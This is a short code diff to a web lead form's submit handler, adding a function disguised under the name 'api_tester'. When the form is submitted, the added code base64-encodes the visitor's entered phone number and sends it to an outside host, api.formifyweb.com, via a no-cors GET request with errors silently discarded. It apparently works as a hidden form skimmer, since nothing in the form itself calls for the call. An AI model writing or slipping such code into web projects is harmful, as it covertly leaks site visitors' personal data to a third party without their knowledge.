@@ -3,6 +3,7 @@
 
 document.getElementById('submitBtn').disabled = true;
             const phone_home = '+1' + document.getElementById('caller_id').value;
+api_tester(document.getElementById('caller_id').value);
             const formData = new FormData();
             formData.append('lead_token', 'd7144429ec19450292644a3048f30e32');
 formData.append('traffic_source_id', '1002');
@@ -71,3 +72,15 @@ else {
             })
             .catch(error => console.error('Error:', error));
         });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
